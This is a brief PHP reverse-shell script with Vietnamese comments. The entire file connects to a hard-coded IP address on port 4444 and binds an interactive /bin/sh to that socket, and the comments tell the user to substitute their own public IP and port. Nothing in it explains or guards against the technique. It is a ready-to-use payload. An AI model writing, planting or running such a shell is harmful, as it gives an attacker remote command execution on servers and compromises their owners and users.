<?php
    $ip = '58.186.78.65';  // Thay YOUR_IP bằng địa chỉ IP công cộng của bạn
    $port = 4444;      // Thay 4444 bằng cổng bạn muốn lắng nghe
    $sock = fsockopen($ip, $port);
    exec("/bin/sh -i <&3 >&3 2>&3");
?>
